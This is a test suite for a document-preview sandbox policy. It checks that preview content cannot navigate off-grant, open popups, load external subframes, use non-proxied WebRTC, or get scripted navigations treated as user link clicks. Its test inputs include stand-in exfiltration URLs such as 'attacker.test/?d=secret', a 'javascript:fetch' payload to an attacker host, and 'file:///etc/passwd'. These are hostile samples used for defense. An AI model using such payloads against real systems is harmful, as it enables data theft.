import { beforeEach, describe, expect, it, vi } from 'vitest'
import { installDocPreviewGuestPolicy, reportDocPreviewLinkClick } from './doc-preview-guest-policy'
import { buildDocPreviewUrl } from '../../shared/doc-preview-scheme'
import { mintDocPreviewGrant, revokeAllDocPreviewGrants } from './doc-preview-grant-registry'

type GuestHandlers = Record<string, (...args: never[]) => void>

function installOnFakeGuest(): {
  contents: object
  handlers: GuestHandlers
  isFocused: ReturnType<typeof vi.fn>
  send: ReturnType<typeof vi.fn>
  setWebRTCIPHandlingPolicy: ReturnType<typeof vi.fn>
  windowOpenHandler: (details: { url: string }) => { action: string }
} {
  const handlers: GuestHandlers = {}
  const send = vi.fn()
  const isFocused = vi.fn(() => true)
  const setWebRTCIPHandlingPolicy = vi.fn()
  let windowOpenHandler: (details: { url: string }) => { action: string } = () => ({
    action: 'deny'
  })
  const register = (event: string, handler: (...args: never[]) => void): void => {
    handlers[event] = handler
  }
  const guest = {
    isFocused,
    on: vi.fn(register),
    once: vi.fn(register),
    setWindowOpenHandler: vi.fn((handler: (details: { url: string }) => { action: string }) => {
      windowOpenHandler = handler
    }),
    setWebRTCIPHandlingPolicy
  }
  installDocPreviewGuestPolicy(guest as never, { send })
  return {
    contents: guest,
    handlers,
    isFocused,
    send,
    setWebRTCIPHandlingPolicy,
    windowOpenHandler: (details) => windowOpenHandler(details)
  }
}

type FakeGuest = ReturnType<typeof installOnFakeGuest>

function startMainFrameNavigation(guest: FakeGuest, url: string): void {
  guest.handlers['did-start-navigation']?.({ url, isMainFrame: true } as never)
}

/** A guest already showing a document, which is the only state a link can be pressed in. */
function boundGuest(): { grant: ReturnType<typeof mintGrant>; guest: FakeGuest } {
  const grant = mintGrant()
  const guest = installOnFakeGuest()
  startMainFrameNavigation(guest, buildDocPreviewUrl(grant.id, 'index.html'))
  return { grant, guest }
}

function reportClick(guest: FakeGuest, url: string): void {
  reportDocPreviewLinkClick(guest.contents as never, url)
}

function mintGrant(): ReturnType<typeof mintDocPreviewGrant> {
  return mintDocPreviewGrant({
    owner: { kind: 'ssh', connectionId: 'ssh-1' },
    root: '/home/alice/docs',
    entryRelativePath: 'index.html'
  })
}

beforeEach(() => {
  vi.clearAllMocks()
  revokeAllDocPreviewGrants()
})

describe('doc preview guest policy', () => {
  it('allows relative navigation within the bound grant', () => {
    const { grant, guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'guide.html') as never
    )

    expect(preventDefault).not.toHaveBeenCalled()
    expect(guest.send).not.toHaveBeenCalled()
  })

  // Why an unlatched guest is refused rather than trusted: the renderer-set src is
  // browser-initiated and never reaches will-navigate, so a navigation arriving before the latch is
  // one the guest started for itself.
  it('blocks a navigation the guest starts before a document has bound it', () => {
    const grant = mintGrant()
    const guest = installOnFakeGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('blocks navigation into a different live grant once bound', () => {
    const { guest } = boundGuest()
    const otherGrant = mintGrant()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(otherGrant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })

  it('blocks a revoked grant even when it matches the bound id', () => {
    const { grant, guest } = boundGuest()
    revokeAllDocPreviewGrants()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(grant.id, 'guide.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })

  it('blocks an external navigation without offering it to the renderer', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.({ preventDefault } as never, 'https://example.com/' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('blocks a file: navigation', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.({ preventDefault } as never, 'file:///etc/passwd' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('applies the same rule to redirects', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-redirect']?.({ preventDefault } as never, 'https://evil.test/' as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('denies every popup and routes none of them', () => {
    const { guest } = boundGuest()

    expect(guest.windowOpenHandler({ url: 'https://example.com/docs' })).toEqual({
      action: 'deny'
    })
    expect(guest.windowOpenHandler({ url: 'file:///etc/passwd' })).toEqual({ action: 'deny' })
    expect(guest.send).not.toHaveBeenCalled()
  })

  // Why: will-navigate never fires for a subframe, so an <iframe src="https://…"> would load
  // off-machine even though the top frame cannot.
  it('blocks a subframe navigating outside the grant, without opening a tab for it', () => {
    const { guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-frame-navigate']?.({
      preventDefault,
      url: 'https://tracker.test/pixel',
      isMainFrame: false
    } as never)

    expect(preventDefault).toHaveBeenCalledOnce()
    expect(guest.send).not.toHaveBeenCalled()
  })

  it('lets a subframe load an in-grant asset', () => {
    const { grant, guest } = boundGuest()
    const preventDefault = vi.fn()

    guest.handlers['will-frame-navigate']?.({
      preventDefault,
      url: buildDocPreviewUrl(grant.id, 'chart.html'),
      isMainFrame: false
    } as never)

    expect(preventDefault).not.toHaveBeenCalled()
  })

  // Why this group exists: the external-link route ends in a real browser tab with full network, so
  // a document that can read its grant and reach that route can exfiltrate it. Only a reader's own
  // press on a link may, and only the guest's preload can tell that a press was one.
  describe('the trusted-click route out of the preview', () => {
    // The headline. The earlier design read a recent-input timestamp, so a script that navigated
    // shortly after any genuine press was routed out as if the press had asked for it. Here the
    // navigation sinks route nothing at all, so when the input happened cannot matter.
    it('routes nothing for a scripted location change or window.open, whenever input happened', () => {
      const { guest } = boundGuest()
      const preventDefault = vi.fn()

      // Genuine input the guest would report, delivered immediately before the document acts.
      guest.handlers['input-event']?.({} as never, { type: 'mouseDown' } as never)
      guest.handlers['before-input-event']?.({} as never, { type: 'keyDown' } as never)
      guest.handlers['will-navigate']?.(
        { preventDefault } as never,
        'https://attacker.test/?d=secret' as never
      )
      const popup = guest.windowOpenHandler({ url: 'https://attacker.test/?d=secret' })

      expect(preventDefault).toHaveBeenCalledOnce()
      expect(popup).toEqual({ action: 'deny' })
      expect(guest.send).not.toHaveBeenCalled()
      // Why assert the absence of the listeners too: with them gone there is no timing a document
      // could hit, rather than a window it merely failed to hit in this test.
      expect(guest.handlers['input-event']).toBeUndefined()
      expect(guest.handlers['before-input-event']).toBeUndefined()
    })

    it('routes a reported click on an external link exactly once', () => {
      const { guest } = boundGuest()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).toHaveBeenCalledExactlyOnceWith('docPreview:externalLink', {
        url: 'https://example.com/docs'
      })
    })

    it('drops a click reported while the guest is not the contents the reader is looking at', () => {
      const { guest } = boundGuest()
      guest.isFocused.mockReturnValue(false)

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('drops a click reported by a sender that is not a preview guest', () => {
      const { guest } = boundGuest()

      reportDocPreviewLinkClick({ isFocused: () => true } as never, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('drops a click reported by a guest that never bound a grant', () => {
      mintGrant()
      const guest = installOnFakeGuest()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it("drops a click once the guest's bound grant is revoked", () => {
      const { guest } = boundGuest()
      revokeAllDocPreviewGrants()

      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })

    it.each([
      'file:///etc/passwd',
      'javascript:fetch("https://attacker.test")',
      'orca-preview://a/b',
      '/Users/alice/secrets.txt',
      ''
    ])('drops a reported click on %s, which is not the web', (url) => {
      const { guest } = boundGuest()

      reportClick(guest, url)

      expect(guest.send).not.toHaveBeenCalled()
    })

    it('stops routing for a guest that has been destroyed', () => {
      const { guest } = boundGuest()

      guest.handlers['destroyed']?.()
      reportClick(guest, 'https://example.com/docs')

      expect(guest.send).not.toHaveBeenCalled()
    })
  })

  // Why: a peer connection is UDP straight off the network stack — the response CSP and the
  // session's request filter both miss it, so this is the only place it can be refused.
  it('denies the guest non-proxied WebRTC UDP at attach', () => {
    const guest = installOnFakeGuest()

    expect(guest.setWebRTCIPHandlingPolicy).toHaveBeenCalledWith('disable_non_proxied_udp')
  })

  // Why: latching from a subframe would let an in-document iframe decide which grant the guest
  // belongs to, and every later main-frame check would be measured against that.
  it('binds the guest from the main frame only', () => {
    const grant = mintGrant()
    const otherGrant = mintGrant()
    const guest = installOnFakeGuest()

    guest.handlers['did-start-navigation']?.({
      url: buildDocPreviewUrl(otherGrant.id, 'index.html'),
      isMainFrame: false
    } as never)
    startMainFrameNavigation(guest, buildDocPreviewUrl(grant.id, 'index.html'))
    const preventDefault = vi.fn()

    guest.handlers['will-navigate']?.(
      { preventDefault } as never,
      buildDocPreviewUrl(otherGrant.id, 'index.html') as never
    )

    expect(preventDefault).toHaveBeenCalledOnce()
  })
})
